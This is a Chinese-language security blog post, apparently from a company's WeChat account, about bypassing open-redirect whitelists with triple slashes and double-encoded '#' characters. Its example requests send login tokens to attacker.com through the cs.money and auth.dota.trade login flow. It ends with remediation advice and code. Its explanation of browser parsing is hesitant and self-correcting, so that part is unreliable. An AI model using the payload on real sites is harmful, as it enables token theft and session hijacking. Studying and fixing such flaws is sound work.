---
title: 重定向绕过另类思路
url: https://mp.weixin.qq.com/s/jo5IP4v6o-pSuCdrL7036A
source: Doonsec's feed
date: 2026-05-06
fetch_date: 2026-05-07T05:29:14.703000
---

# 重定向绕过另类思路

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EH6KHiaolAFCzmHeUFeicoOl6dFm5f0yYHecSc8olrZbPd3Kt9TatT4iarnJIkkyszlFtm4nxnA7RRdlfD6eXfs7awvicTQ1iancxgDYqKYGCjd0/0?wx_fmt=jpeg)

# 重定向绕过另类思路

镌远科技
镌远科技

河北镌远网络科技有限公司

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_gif/5xic9OHsHiafbUVg4naibSQnNsuMVRYqdlLLzHovhH9jcrrEaj6ia94y9TTpBJTlQDQBcgwMczFq8BRURR9fJIdeLg/640?wx_fmt=gif&from=appmsg)

一个容易被忽视的URL解析差异，可能让你的防护策略瞬间失效

在渗透测试中，**开放重定向（Open Redirect）** 漏洞虽常被归类为“低危”，但其利用价值不容小觑——结合钓鱼、SSRF、OAuth劫持等场景，往往能撬动更高危的漏洞。

常规的绕过手法大家耳熟能详：https://trusted.com.evil.com、https://trusted.com@evil.com、双重编码等等。而今天分享一个另类但同样致命的绕过思路——**利用三个斜杠**///**欺骗服务端与浏览器的解析差异**。

---

**一、 正常流程回顾**

先看一个典型的登录重定向场景：

1. 用户访问 https://cs.money/dashboard，未登录，被引导至认证服务 auth.dota.trade。

2. 认证服务通过参数 redirectUrl 和 callbackUrl 记录原始跳转地址：

http

GET /login?redirectUrl=https://cs.money/dashboard&callbackUrl=https://cs.money/dashboard HTTP/1.1

Host: auth.dota.trade

3. 用户输入凭证，登录成功，服务端返回302响应：

http

HTTP/1.1 302 Found

Location: https://cs.money/dashboard?token=USER\_TOKEN

4. 浏览器跳转到目标地址，用户正常进入仪表盘。

一切正常——服务端严格限制了跳转域名必须是 cs.money。

---

**二、 漏洞利用：三个斜杠的魔力**

攻击者构造一个恶意登录链接，发送给目标用户：

http

GET /login?redirectUrl=https://cs.money///attacker.com%2523&callbackUrl=https://cs.money///attacker.com%2523 HTTP/1.1

Host: auth.dota.trade

注意其中的 https://cs.money///attacker.com%2523。服务端收到后，通常会校验 redirectUrl 的域名是否为合法白名单（如 cs.money）。由于字符串以 https://cs.money/ 开头，服务端如果仅做简单的前缀匹配或正则校验，会认为这是合法的。

登录成功后，服务端构造跳转地址：

http

HTTP/1.1 302 Found

Location: https://cs.money///attacker.com#?token=USER\_TOKEN

**关键点来了**：浏览器在解析这个Location时，遵循URL规范。对于 https://cs.money///attacker.com，浏览器会这样做：

·提取协议 https:

·主机名：默认从第一个 // 之后到下一个 / 或 ? 或 # 或行尾。

·但这里出现了 **三个斜杠**：https:// 后的第一个 // 属于主机部分，紧接着第三个 / 则表示路径的开始。

·实际上，https://cs.money///attacker.com 会被浏览器规范化为 https://cs.money//attacker.com，然后 //attacker.com 被解释为**路径片段**？不对，我们再仔细分析。

更准确地说：URL语法中，scheme://host/path。https://cs.money///attacker.com 的主机是 cs.money，而 //attacker.com 是路径的一部分。但是浏览器在显示地址栏或发送请求时，会重新解析。实际上，当浏览器看到 Location: https://cs.money///attacker.com#?token=... 时，它会向 cs.money 发起请求，路径为 ///attacker.com？

然而用户提供的流程中，最终请求变成了：

http

GET /#?token=USER\_TOKEN HTTP/1.1

Host: attacker.com

这表明浏览器并没有向 cs.money 发请求，而是直接跳转到了 attacker.com。这是怎么回事？

---

**三、 深度解析：浏览器对 location 的特殊处理**

关键原因在于 **URL 中的斜杠数量对主机名解析的影响**。

观察这个地址：https://cs.money///attacker.com

·标准URL中，https:// 之后第一个 // 是主机名开始和结束的标志。

·但连续三个斜杠，第二个 // 会被某些浏览器的URL解析器视为**将后续内容重新解析为新的 scheme 或 host**。实际上，在HTTP重定向中，Location字段的值通常会被浏览器交给URL解析器。对于 https://cs.money///attacker.com，部分解析算法会认为：

o协议：https

o主机：cs.money

o路径：//attacker.com（此时路径的开始就是两个斜杠）

o然而，由于路径以 // 开头，在某些算法中可能触发“相对协议”或“网络路径引用”的二次解析，导致浏览器最终将请求发送给 attacker.com。

更简单的解释：某些浏览器（或URL库）在解析location时，如果发现路径部分以双斜杠开头，会把双斜杠后的内容重新当作主机名处理。这是一种历史遗留行为，主要用于处理 //example.com 这样的网络路径引用。

用户示例中使用了 %2523（即 # 两次编码），最终形成 #?token=。这也起到了截断作用，使得前面的路径部分更加异常。

综合来看，该利用方式的本质是：**服务端仅简单校验字符串前缀，认为域名仍是**cs.money**；而浏览器在解析时，由于多个斜杠的存在，错误地将**attacker.com**当成了主机名**。

---

**四、 实际测试效果**

构造恶意链接发送给已登录用户（或诱骗其登录），用户认证成功后会被重定向到：

text

https://attacker.com/#?token=USER\_TOKEN

攻击者即可获取用户携带的token，进而劫持会话。甚至不需要token，单纯的重定向也可用于钓鱼攻击。

---

**五、 修复建议**

**服务端不要信任简单的白名单前缀匹配**

应使用严格的域名解析函数（如Java的 URL 类、Python的 urllib.parse）提取 redirect\_uri 中的 **host**，与白名单进行精确比对。

python

*# 不安全的做法*

if redirect\_url.startswith("https://trusted.com"):

    return redirect(redirect\_url)

*# 安全的做法*

from urllib.parse import urlparse

parsed = urlparse(redirect\_url)

if parsed.hostname in trusted\_hosts:

    return redirect(redirect\_url)

**对重定向参数进行规范化**

先对URL进行完整解析，再重新构建规范化URL，可消除多余的斜杠和编码混淆。

**使用白名单映射，禁止用户直接传入完整URL**

业务上可改为传入一个 redirect\_id，服务端查表返回真实地址。

**浏览器层面的防御**

现代浏览器已逐步收紧对奇怪Location的处理，但并非全部。建议服务端始终输出绝对URL且路径不含//。

免责声明：因传播、利用本公众号“河北镌远网络科技有限公司”所提供信息而产生的任何直接或间接后果及损失，均由使用者本人自行承担，本公众号及作者不承担任何责任。本公众号所发表内容中，凡注明来源的，版权归原出处所有；无法查证版权或未注明出处的，均来自网络并系转载，转载旨在传递更多信息，版权归原作者所有。若存在侵权情况，请联系小编，我们将第一时间删除处理。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafYW3QgXBz1b5H4ibkrGDyiaMY9GyomiaWib5oKm6chXCj8uMuZOQMXvUKAic6jfbSG5jKicTdNZia815xQmA/0?wx_fmt=png)

河北镌远网络科技有限公司

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafYW3QgXBz1b5H4ibkrGDyiaMY9GyomiaWib5oKm6chXCj8uMuZOQMXvUKAic6jfbSG5jKicTdNZia815xQmA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过